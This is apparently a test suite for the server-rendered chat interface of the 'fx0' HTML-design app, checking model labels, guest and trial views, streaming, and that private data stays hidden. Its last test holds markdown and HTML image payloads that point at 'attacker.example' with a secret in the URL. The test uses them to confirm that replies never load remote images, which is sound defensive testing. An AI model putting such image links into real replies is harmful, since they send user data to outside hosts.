import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { registerHooks } from 'node:module'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import test, { after } from 'node:test'
import { createElement } from 'react'
import { renderToStaticMarkup, renderToPipeableStream } from 'react-dom/server'
import { PassThrough } from 'node:stream'

// Compile only the UI entry point, so parent-owned server work cannot block this
// smoke test. No browser, build output, or dependency changes are required.
const root = new URL('../', import.meta.url)
const projectUrl = new URL('../package.json', import.meta.url).href
const output = realpathSync(mkdtempSync(join(tmpdir(), 'fx0-html-ui-')))
after(() => rmSync(output, { recursive: true, force: true }))
execFileSync(fileURLToPath(new URL('../node_modules/.bin/tsc', import.meta.url)), [
  '--ignoreConfig', '--outDir', output, '--strict', '--types', 'node',
  '--jsx', 'react-jsx', '--target', 'esnext', '--module', 'esnext',
  '--moduleResolution', 'bundler', '--skipLibCheck', '--esModuleInterop',
  'components/chat-app.tsx',
], { cwd: root, stdio: 'pipe' })
writeFileSync(join(output, 'package.json'), '{"type":"module"}')
const outputUrl = pathToFileURL(`${output}/`).href
const hooks = registerHooks({ resolve(specifier, context, nextResolve) {
  if (!context.parentURL?.startsWith(outputUrl)) return nextResolve(specifier, context)
  if (specifier.startsWith('.')) return nextResolve(`${specifier.replace(/\.ts$/, "")}.js`, context)
  return nextResolve(specifier, { ...context, parentURL: projectUrl })
} })
after(() => hooks.deregister())
const { compactTranscript } = await import(pathToFileURL(join(output, 'lib/transcript.js')).href)
const { default: ChatApp } = await import(pathToFileURL(join(output, 'components/chat-app.js')).href)
const { TooltipProvider } = await import(pathToFileURL(join(output, 'components/ui/tooltip.js')).href)
const { default: PreviewPane } = await import(pathToFileURL(join(output, 'components/preview-pane.js')).href)
const { default: Markdown } = await import(pathToFileURL(join(output, 'components/markdown.js')).href)
const { default: NewChat } = await import(pathToFileURL(join(output, 'components/new-chat.js')).href)


// A promise React has seen resolve renders synchronously, like the streamed HTML.
function resolved(value) {
  return Object.assign(Promise.resolve(value), { status: 'fulfilled', value })
}

function renderChat({ events = [], revision = 0, guest = false, defaultModel = '', preference } = {}) {
  return renderToStaticMarkup(createElement(TooltipProvider, null, createElement(ChatApp, {
    account: resolved({ user: guest ? null : { id: 'user-123', name: 'Ada', email: 'ada@example.com', picture: null }, team: null }),
    sidebar: resolved({ sessions: guest ? [] : [{ id: 'design-session', title: 'My design', createdAt: 1, lastActivity: 1, busy: false }], nextCursor: null }),
    boot: resolved({ sessionId: guest ? 'draft' : 'design-session', snapshot: { transcript: compactTranscript(guest ? [] : events, { artifactRevision: guest ? 0 : revision }), summary: guest ? null : { id: 'design-session', title: 'My design', createdAt: 1, lastActivity: 1, busy: false } }, now: 1, missing: false }),
    preference,
    defaultModel,
  })))
}

test('the static composer reserves the model label without painting the default before preferences load', (t) => {
  t.mock.method(globalThis, 'fetch', () => assert.fail('SSR must not fetch model preferences'))
  const markup = renderChat({ guest: true, defaultModel: 'anthropic/claude-opus-5.5-fast' })
  assert.match(markup, /aria-label="Model: loading" aria-busy="true"/)
  assert.doesNotMatch(markup, /aria-label="Model: claude-opus-5\.5"/)
  assert.match(markup, /name="prompt"/)
})

test('the server-rendered draft names the remembered model, never the app default', (t) => {
  t.mock.method(globalThis, 'fetch', () => assert.fail('SSR must not fetch model preferences'))
  const markup = renderChat({ guest: true, defaultModel: 'anthropic/claude-opus-5.5-fast', preference: resolved({ sessionId: 'draft', model: 'openai/gpt-6', effort: '', fast: false }) })
  assert.match(markup, />gpt-6</)
  assert.doesNotMatch(markup, />claude-opus-5\.5</)
})

test('a reloaded chat names its own stored model in the server HTML', (t) => {
  t.mock.method(globalThis, 'fetch', () => assert.fail('SSR must not fetch model preferences'))
  const markup = renderChat({ defaultModel: 'anthropic/claude-opus-5.5-fast', preference: resolved({ sessionId: 'design-session', model: 'openai/gpt-6', effort: '', fast: false }) })
  assert.match(markup, />gpt-6</)
  assert.doesNotMatch(markup, />claude-opus-5\.5</)
})

test('trial first paint offers sign-in, free prompts and a fixed model while retaining owned designs', (t) => {
  t.mock.method(globalThis, 'fetch', () => assert.fail('Trial SSR must not fetch'))
  const markup = renderToStaticMarkup(createElement(TooltipProvider, null, createElement(ChatApp, {
    account: resolved({ user: { id: 'guest:owned', name: 'You', email: null, picture: null, guest: true }, team: null, freePrompts: 3 }),
    sidebar: resolved({ sessions: [{ id: 'trial-chat', title: 'Guest design', createdAt: 1, lastActivity: 1, busy: false }], nextCursor: null }),
    boot: resolved({ sessionId: 'trial-chat', snapshot: { transcript: compactTranscript([{ type: 'user', seq: 1, id: 1, text: 'My trial prompt' }], { artifactRevision: 2 }), summary: null }, now: 1, missing: false }),
    defaultModel: 'anthropic/claude-opus-5.5-fast',
  })))
  assert.match(markup, />Sign in</)
  assert.doesNotMatch(markup, /Account: You|billing team/)
  assert.match(markup, /3 free prompts left/)
  assert.match(markup, /disabled="" aria-label="Model: claude-opus-5\.5(-fast)?"/)
  assert.match(markup, /Guest design|My trial prompt/)
  assert.match(markup, /\/api\/artifact-frame\?session=trial-chat&amp;v=2/)
})

test('signed-in first paint offers free prompts only for an eligible chat', () => {
  for (const trialChat of [false, true]) {
    const summary = { id: 'existing-chat', title: 'Existing design', createdAt: 1, lastActivity: 1, busy: false, ...(trialChat ? { trialChat: true } : {}) }
    const markup = renderToStaticMarkup(createElement(TooltipProvider, null, createElement(ChatApp, {
      account: resolved({ user: { id: 'user-1', name: 'User', email: null, picture: null }, team: null, freePrompts: 3 }),
      sidebar: resolved({ sessions: [summary], nextCursor: null }),
      boot: resolved({ sessionId: 'existing-chat', snapshot: { transcript: compactTranscript([], { artifactRevision: 0 }), summary }, now: 1, missing: false }),
      defaultModel: 'anthropic/claude-opus-5.5-fast',
    })))
    if (trialChat) assert.match(markup, /3 free prompts left/)
    else {
      assert.doesNotMatch(markup, /3 free prompts left/)
      assert.match(markup, /Uses your billing team/)
    }
  }
})

test('HTML-only first paint includes SSR profile, history, settings and design suggestions', (t) => {
  const fetch = t.mock.method(globalThis, 'fetch', () => assert.fail('SSR UI must not fetch identity or credits'))
  const markup = renderChat()
  assert.match(markup, /Account: Ada/)
  assert.match(markup, /My design/)
  assert.match(markup, /new HTML design/)
  assert.match(markup, /Design a landing page/)
  assert.match(markup, /aria-label="Model:/)
  // Effort and Fast live in the closed model popover and are catalog-gated.
  assert.equal(fetch.mock.callCount(), 0)
})

test('guest first paint keeps the same panes, model picker and editable composer without private data', (t) => {
  const fetch = t.mock.method(globalThis, 'fetch', () => assert.fail('Guest SSR must not fetch'))
  const markup = renderChat({ guest: true, revision: 2, events: [{ type: 'user', text: 'PRIVATE HISTORY' }] })
  for (const contract of [/>Sign in</, /new HTML design/, /<h1[^>]*>(?:<span[^>]*>)?Design(?:<\/span>)?(?:<span[^>]*><\/span>)?<\/h1>/, /Design a landing page/, /aria-label="Model:/, /name="prompt"/, /Toggle sidebar/, /Resize conversation and preview/, /<h2[^>]*>fx0<\/h2>/]) assert.match(markup, contract)
  assert.doesNotMatch(markup, /PRIVATE HISTORY|Account: Ada|artifact-frame|Sign in required|disabled=""[^>]*name="prompt"|open session diagnostics|copy, download or publish/)
  assert.equal(fetch.mock.callCount(), 0)
})

test('a chat with a published design renders its transcript and the isolated preview', () => {
  const markup = renderChat({ revision: 2, events: [
    { type: 'user', seq: 1, id: 1, text: 'Keep this history', author: 'Ada' },
    { type: 'text', seq: 2, id: 1, delta: 'Your design is ready.' },
  ] })
  assert.match(markup, /Keep this history/)
  assert.match(markup, /Your design is ready/)
  assert.match(markup, /\/api\/artifact-frame\?session=design-session&amp;v=2/)
  assert.match(markup, /referrerPolicy="no-referrer"/i)
  assert.match(markup, /title="Design artifact preview"/)
  // The header's actions come with the first paint, not after the client adopts the chat.
  assert.match(markup, /<h1[^>]*><button[^>]*aria-haspopup="dialog"[\s\S]*?>[\s\S]*?My design[\s\S]*?<\/button><\/h1>/)
  assert.match(markup, /aria-label="copy, download or publish the design"/)
})

test('a denied preview renders neither its published frame nor an in-progress private draft', () => {
  const markup = renderToStaticMarkup(createElement(PreviewPane, {
    source: { kind: 'design', sessionId: 'private-session', revision: 2 },
    viewing: null,
    draft: '<!doctype html><html><head></head><body><p>Private draft</p></body></html>',
    accessAllowed: false,
    intro: false,
    onClose: () => {},
  }))
  assert.doesNotMatch(markup, /<iframe|artifact-frame|Design preview while generating|Private draft/)
})

test('a reloaded transcript is anchored at its end until the client takes over', () => {
  const markup = renderChat({ revision: 0, events: [{ type: 'user', seq: 1, id: 1, text: 'Keep this history', author: 'Ada' }] })
  // A reversed flex column scrolls from its end, so every paint of a partly parsed
  // page shows the end of the chat; the content stays full width and top-aligned.
  assert.match(markup, /class="min-h-0 flex-1 overflow-y-auto overscroll-contain [^"]*flex-col-reverse[^"]*"/)
  assert.match(markup, /class="mx-auto mb-auto w-full max-w-2xl px-4 py-4 sm:px-5"><div[^>]*>[\s\S]*Keep this history/)
  // No design yet: title menu is active, but nothing to export, and no fx0 explainer in the preview.
  assert.match(markup, /<h1[^>]*><button[^>]*aria-haspopup="dialog"[\s\S]*?>[\s\S]*?My design[\s\S]*?<\/button><\/h1>/)
  assert.doesNotMatch(markup, /copy, download or publish|<h2[^>]*>fx0<\/h2>/)
})

test('empty artifact preview explains how fx0 works', () => {
  const markup = renderToStaticMarkup(createElement(PreviewPane, {
    source: { kind: 'design', sessionId: 'design-session', revision: 0 },
    intro: true,
    onClose: () => {},
  }))
  assert.match(markup, /<h2[^>]*>fx0<\/h2>/)
  assert.match(markup, /href="https:\/\/github\.com\/vercel-labs\/fx0\/fork"/)
  // No design yet, so no frame.
  assert.doesNotMatch(markup, /<iframe|preparing|retry/)
})

test('a chat waiting on its first design keeps the preview blank', () => {
  const markup = renderToStaticMarkup(createElement(PreviewPane, {
    source: { kind: 'design', sessionId: 'design-session', revision: 0 },
    intro: false,
    onClose: () => {},
  }))
  assert.doesNotMatch(markup, /<h2[^>]*>fx0<\/h2>|<iframe/)
})

test('new-design controls stay enabled in full and compact layouts', () => {
  for (const compact of [false, true]) {
    const markup = renderToStaticMarkup(createElement(NewChat, { compact, onNew: () => {} }))
    assert.match(markup, /aria-label="new HTML design"/)
    assert.doesNotMatch(markup, /disabled=""|aria-busy|creating…/)
    if (!compact) assert.match(markup, /new design/)
  }
})

test('account and sidebar HTML stream without waiting for the transcript', async () => {
  let resolveAccount, resolveSidebar, resolveChat
  const account = new Promise((resolve) => { resolveAccount = resolve })
  const sidebar = new Promise((resolve) => { resolveSidebar = resolve })
  const boot = new Promise((resolve) => { resolveChat = resolve })
  const chunks = []
  const output = new PassThrough()
  output.on('data', (chunk) => chunks.push(chunk.toString()))
  const ended = new Promise((resolve) => output.on('end', resolve))
  let ready
  const shell = new Promise((resolve) => { ready = resolve })
  const stream = renderToPipeableStream(createElement(TooltipProvider, null,
    createElement(ChatApp, { account, sidebar, boot, defaultModel: 'test' })), {
    onShellReady() { stream.pipe(output); ready() },
    onError(error) { assert.fail(error) },
  })
  await shell
  assert.match(chunks.join(''), /prompt-input/)
  assert.match(chunks.join(''), /new HTML design/)
  // A saved collapsed rail is applied by the layout script before hydration.
  // Its controls and account space must already exist while identity is pending.
  assert.match(chunks.join(''), /aria-label="show sessions"/)
  const footer = chunks.join('').match(/<footer[^>]*aria-label="Conversation account"[^>]*>([\s\S]*?)<\/footer>/)?.[1]
  assert.ok(footer, 'the initial shell reserves the conversation account row')
  assert.match(footer, /Loading account/)
  assert.match(footer, /source/)
  resolveAccount({ user: { id: 'user-a', name: 'Early Account', email: null, picture: null }, team: 'team-a' })
  await new Promise(setImmediate)
  await new Promise(setImmediate)
  assert.match(chunks.join(''), /Account: Early Account/)
  assert.doesNotMatch(chunks.join(''), /Older conversation|Saved answer/)
  resolveSidebar({ sessions: [{ id: 'chat', title: 'Older conversation', createdAt: 1, lastActivity: 1, busy: false }], nextCursor: 'older' })
  await new Promise(setImmediate)
  await new Promise(setImmediate)
  assert.match(chunks.join(''), /Older conversation/)
  assert.match(chunks.join(''), /Load more chats/)
  assert.doesNotMatch(chunks.join(''), /Saved answer/)
  resolveChat({ sessionId: 'chat', snapshot: { transcript: compactTranscript([{ type: 'text', seq: 1, turnId: 1, delta: 'Saved answer' }], { artifactRevision: 0 }), summary: null }, now: 1, missing: false })
  await ended
  assert.match(chunks.join(''), /Saved answer/)
})

test('reply text never loads a remote image', () => {
  const html = renderToStaticMarkup(createElement(Markdown, null,
    'Done\n\n![x](https://attacker.example/p.png?d=secret)\n\n[![y](https://attacker.example/q.png)](https://example.com)\n\n<img src="https://attacker.example/r.png">'))
  assert.doesNotMatch(html, /<img|attacker\.example\/[pq]\.png|rel="preload"/)
  assert.match(html, /&lt;img/)
  assert.match(html, /<p>Done<\/p>/)
  assert.match(html, /href="https:\/\/example\.com"/)
})
